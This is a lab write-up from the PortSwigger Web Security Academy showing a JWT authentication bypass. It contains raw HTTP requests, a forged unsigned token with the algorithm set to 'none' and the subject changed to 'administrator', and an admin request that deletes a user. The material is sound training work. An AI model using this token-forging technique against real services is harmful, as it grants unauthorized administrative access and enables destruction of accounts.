---
tags:
  - jwt
---
# JWT authentication bypass via flawed signature verification

## Instructions

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Notice that after logging in a cookie is set that contains a JWT.

```text title="Initial login"
POST /login HTTP/1.1
Host: 0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net
Connection: keep-alive
Referer: https://0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net/login
Cookie: session=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i

csrf=SvlyMVemVivhHcVPrwzc3lM2riaZeaA7&username=wiener&password=peter
```

```text title="Initial response"
HTTP/1.1 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI0ZTMyMTI4YS1iZTVkLTQzMDYtYWMyMS0xYTRiZDI5ZjZkNDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MzcwMywic3ViIjoid2llbmVyIn0.i0jz_z3igJOq324sJKAWUEzAEMK3mqo1lupgdC8TZrE42cT0B3ajfwsi6A_BsgY9i7LI91RHxjm3Se-2h04-jjrC2BPu4o4rYoaJ03NSoDT9EZuotN9ab8I5hZFwU2tV4nitG7YNCQ8zPdxtB3rzCoZ1VSi619jpGFFuoc0lDb-Wm2iN_iL5caGNs8yg4mn1akTJP-rB68Y_zJEN79rP7HcmqcX-TQSFEap0cMJu2fthYJ7eHXuiRhhNlQevZ2cm0HqVlBZlxZPpeo7ebbZJNesiwhtYIOw4ZZEXrdGJ5UHQexe8xM9kUaWSSXk2UlERQpqsiGQpOJdb0WIomvoO_g; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0
```

Execute a "none" algorithm attack again, change the sub value from "wiener" to "administrator", and drop it in a previous request.

Send the following request with the new JWT

```text title="Request to delete carlos"
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a8e00b6043d305881f398dd00ba00ad.web-security-academy.net/login
Connection: keep-alive
Cookie: session=eyJraWQiOiI0ZTMyMTI4YS1iZTVkLTQzMDYtYWMyMS0xYTRiZDI5ZjZkNDUiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MzcwMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i


```

## Lesson learned

Check if it's possible to change the algorithm to none.